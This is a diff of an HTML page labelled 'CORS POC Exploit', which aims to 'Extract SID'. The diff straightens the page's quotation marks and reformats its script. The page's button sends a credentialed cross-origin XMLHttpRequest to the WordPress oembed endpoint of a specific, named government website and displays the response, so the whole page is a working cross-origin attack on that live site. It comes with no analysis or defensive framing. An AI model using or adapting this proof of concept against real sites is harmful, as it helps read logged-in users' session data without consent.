@@ -4,21 +4,24 @@
 <center>
 <h2>CORS POC Exploit</h2>
 <h3>Extract SID</h3>
-<div id=”demo”>
-<button type=”button” onclick=”cors()”>Exploit</button>
+ 
+<div id="demo">
+<button type="button" onclick="cors()">Exploit</button>
 </div>
+ 
 <script>
 function cors() {
-var xhttp = new XMLHttpRequest();
-xhttp.onreadystatechange = function() {
-if (this.readyState == 4 && this.status == 200) {
-document.getElementById(“demo”).innerHTML = alert(this.responseText);
-}
-};
-xhttp.open(“GET”,”http://dlhk.karawangkab.go.id/wp-json/oembed/1.0/embed?url=http://www.dlhk.karawangkab.go.id”, true);
-xhttp.withCredentials = true;
-xhttp.send();
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementById("demo").innerHTML = alert(this.responseText);
+    }
+  };
+  xhttp.open("GET", "http://www.dlhk.karawangkab.go.id/wp-json/oembed/1.0/embed?url=http://www.dlhk.karawangkab.go.id/pencemaran-barugbug-disoroti-pusat/", true);
+  xhttp.withCredentials = true;
+  xhttp.send();
 }
 </script>
+ 
 </body>
 </html>
